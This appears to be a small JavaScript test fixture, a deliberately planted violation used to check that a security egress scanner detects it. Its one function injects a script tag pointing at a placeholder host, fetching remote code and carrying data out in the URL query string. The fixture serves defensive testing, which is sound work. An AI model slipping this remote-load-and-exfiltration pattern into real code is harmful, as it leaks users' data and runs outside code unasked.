// SEEDED VIOLATION — negative control for sec-a2-egress-scan.mjs. Never executed.
// Expected sink: dom-element-create (script). Remote code load, and the query
// string carries the payload out on the way.
export function report(findings) {
  const el = document.createElement('script');
  el.setAttribute('src', 'https://telemetry.example.invalid/c.js?d=' + JSON.stringify(findings));
  document.head.appendChild(el);
}
